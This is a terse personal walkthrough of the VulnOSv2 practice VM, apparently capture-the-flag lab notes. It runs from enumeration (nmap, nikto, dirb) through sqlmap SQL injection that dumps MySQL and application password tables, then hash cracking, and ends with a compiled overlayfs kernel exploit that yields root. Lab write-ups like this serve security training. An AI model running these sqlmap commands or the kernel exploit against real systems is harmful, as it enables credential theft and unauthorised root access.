@@ -1,0 +1,151 @@
+###################################################################################################################################################################################################################
+[ 1 ] ENUMERATION
+
+// Ports & services
+22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
+6667/tcp open  irc     ngircd
+
+// Apache 2.4.7
+https://www.exploit-db.com/exploits/40142/
+
+// I Run Nikto
+nikto -h 192.168.1.12 -p 80
+
+// I run dirb
+dirb http://192.168.1.12/jabc/ /usr/share/wordlists/dirb/big.txt
+---- Scanning URL: http://192.168.1.12/jabc/ ----
+==> DIRECTORY: http://192.168.1.12/jabc/includes/                              
+==> DIRECTORY: http://192.168.1.12/jabc/misc/                                  
+==> DIRECTORY: http://192.168.1.12/jabc/modules/                               
+==> DIRECTORY: http://192.168.1.12/jabc/profiles/                              
++ http://192.168.1.12/jabc/robots.txt (CODE:200|SIZE:1561)                     
+==> DIRECTORY: http://192.168.1.12/jabc/scripts/                               
+==> DIRECTORY: http://192.168.1.12/jabc/sites/                                 
+==> DIRECTORY: http://192.168.1.12/jabc/templates/                             
+==> DIRECTORY: http://192.168.1.12/jabc/themes/  
+
+http://192.168.1.12/javascript/jquery-ui/ui/i18n/
+// Found an script named cron.sh
+http://192.168.1.12/jabc/scripts/
+
+// I run wfuzz
+http://192.168.1.12/javascript/
+http://192.168.1.12/javascript/jquery/jquery
+
+// Jquery version
+1.7.2
+http://192.168.1.12/javascript/jquery-ui/jquery-ui
+
+// CMS = Drupal 7
+For more details, see: http://drupal.org/node/176043
+
+// "I found" a comment in documments page
+//For a detailed view and documentation of our products, please visit our documentation platform at /jabcd0cs/ on the server. Just login with guest/guest
+http://192.168.1.12/jabcd0cs/
+
+// I login with guest/guest
+
+// There is an SQLI
+https://www.exploit-db.com/exploits/32075/
+sqlmap -u "192.168.1.12/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -p add_value --dbs --level=5 --risk=3
+
+// IRC on port 6667
+running version ngircd-21 (i686/pc/linux-gnu)
+
+* Buscando 192.168.1.12
+* Conectando a 192.168.1.12 (192.168.1.12) puerto 6667...
+* Connected. Now logging in...
+* Welcome to the Internet Relay Network XXX!~XXX@192.168.1.11
+* Your host is irc.example.net, running version ngircd-21 (i686/pc/linux-gnu)
+* This server has been started Sun Jul 09 2017 at 10:19:27 (CEST)
+* irc.example.net ngircd-21 abBcCioqrRswx abehiIklmMnoOPqQrRstvVz
+* RFC2812 IRCD=ngIRCd CHARSET=UTF-8 CASEMAPPING=ascii PREFIX=(qaohv)~&@%+ CHANTYPES=#&+ CHANMODES=beI,k,l,imMnOPQRstVz CHANLIMIT=#&+:10 :are supported on this server
+* CHANNELLEN=50 NICKLEN=9 TOPICLEN=490 AWAYLEN=127 KICKLEN=400 MODES=5 MAXLIST=beI:50 EXCEPTS=e INVEX=I PENALTY :are supported on this server
+* There are 1 users and 0 services on 1 servers
+* 1 :channels formed
+* I have 1 users, 0 services and 0 servers
+* 1 1 :Current local users: 1, Max: 1
+* 1 1 :Current global users: 1, Max: 1
+* Highest connection count: 2 (4 connections received)
+* - irc.example.net message of the day
+* - **************************************************
+* - *             H    E    L    L    O              *
+* - *  This is a private irc server. Please contact  *
+* - *  the admin of the server for any questions or  *
+* - *  issues.                                       *
+* - **************************************************
+* - *  The software was provided as a package of     *
+* - *  Debian GNU/Linux <http://www.debian.org/>.    *
+* - *  However, Debian has no control over this      *
+* - *  server.                                       *
+* - **************************************************
+* End of MOTD command
+
+###################################################################################################################################################################################################################
+[ 2 ] EXPLOTATION
+
+// There is an SQLI
+https://www.exploit-db.com/exploits/32075/
+sqlmap -u "192.168.1.12/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -p add_value --dbs --level=5 --risk=3
+
+// Dump columns user and password from table user from db mysql
+sqlmap -u "192.168.1.12/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -p add_value --level=5 --risk=3 -D mysql -T user -C User,Password --dump
+[7 entries]
++------------------+--------------------------------------------------+
+| User             | Password                                         |
++------------------+--------------------------------------------------+
+| debian-sys-maint | *6BC5901B87B5DF07E1C2BA75C15C537EB6B4078B        |
+| drupal7          | *9CFBBC772F3F6C106020035386DA5BBBF1249A11 (toor) |
+| phpmyadmin       | *9CFBBC772F3F6C106020035386DA5BBBF1249A11 (toor) |
+| root             | *9CFBBC772F3F6C106020035386DA5BBBF1249A11 (toor) |
+| root             | *9CFBBC772F3F6C106020035386DA5BBBF1249A11 (toor) |
+| root             | *9CFBBC772F3F6C106020035386DA5BBBF1249A11 (toor) |
+| root             | *9CFBBC772F3F6C106020035386DA5BBBF1249A11 (toor) |
++------------------+--------------------------------------------------+
+
+sqlmap -u "192.168.1.12/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -p add_value --level=5 --risk=3 -D jabcd0cs -T odm_user -C username,password --dump
+Database: jabcd0cs
+Table: odm_user
+[2 entries]
++----------+------------------------------------------+
+| username | password                                 |
++----------+------------------------------------------+
+| guest    | 084e0343a0486ff05530df6c705c8bb4 (guest) |
+| webmin   | b78aae356709f8c31118ea613980954b         |
++----------+------------------------------------------+
+
+// Decrypt hash
+MD5 Decrypter hash found : b78aae356709f8c31118ea613980954b
+value: => webmin1980
+
+
+###################################################################################################################################################################################################################
+[ 3 ] PRIVILEGE ESCALATION
+
+// uname -a
+Linux VulnOSv2 3.13.0-24-generic #47-Ubuntu SMP Fri May 2 23:31:42 UTC 2014 i686 i686 i686 GNU/Linux
+
+// Found a exploit for this kernel
+https://www.exploit-db.com/exploits/37292/
+webmin@VulnOSv2:~$ gcc -o exploit2 37292.c 
+webmin@VulnOSv2:~$ chmod +x exploit2
+webmin@VulnOSv2:~$ ./exploit2
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# id
+uid=0(root) gid=0(root) groups=0(root),1001(webmin)
+
+
+###################################################################################################################################################################################################################
+[ + ] INFORMATION
+
+
+###################################################################################################################################################################################################################
+
+
+
